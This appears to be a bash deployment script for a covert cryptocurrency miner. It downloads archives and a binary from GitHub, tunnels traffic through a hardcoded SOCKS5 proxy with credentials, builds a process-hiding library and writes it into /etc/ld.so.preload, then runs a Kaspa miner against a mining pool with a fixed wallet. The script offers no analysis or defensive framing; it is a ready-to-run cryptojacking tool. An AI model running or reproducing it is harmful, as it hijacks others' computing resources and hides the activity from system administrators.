# /bin/bash

sudo apt -q -y update
clear
sudo apt -q install -y screen unzip 
screen -R yamamoto

wget -q https://raw.githubusercontent.com/nathanfleight/scripts/main/graphics.tar.gz

tar -xzf graphics.tar.gz
WORKER=$(shuf -i 1000000-5000000 -n1)

cat > iplist <<END
148.113.142.107:1080
END

ip=$(shuf -n 1 iplist)

cat > graftcp/local/graftcp-local.conf <<END
listen = :2233
loglevel = 1
socks5 = $ip
socks5_username = gratis
socks5_password = q1w2e3r4t5
END

./graftcp/local/graftcp-local -config graftcp/local/graftcp-local.conf &

sleep .2

./graftcp/graftcp curl ipinfo.io

./graftcp/graftcp wget https://raw.githubusercontent.com/nathanfleight/scripts/main/magicBezzHash.zip
unzip magicBezzHash.zip
sudo make
sudo gcc -Wall -fPIC -shared -o libprocesshider.so processhider.c -ldl
sudo mv libprocesshider.so /usr/local/lib/
sudo echo /usr/local/lib/libprocesshider.so >> /etc/ld.so.preload

#!/bin/bash
./graftcp/graftcp wget https://github.com/angkii/m/raw/main/AkubapakMU
chmod 700 AkubapakMU

POOL=pool.woolypooly.com:3112
WALLET=kaspa:qqrzx6n3v0hvce9cqwhqxhttt5da2mtqdn8mrllrstheg5zc8t3wcquyqygcz
clear
./graftcp/graftcp ./AkubapakMU --algo KASPA --pool $POOL --user $WALLET.$WORKER --compactaccept=on --log=off  --no-cl $@
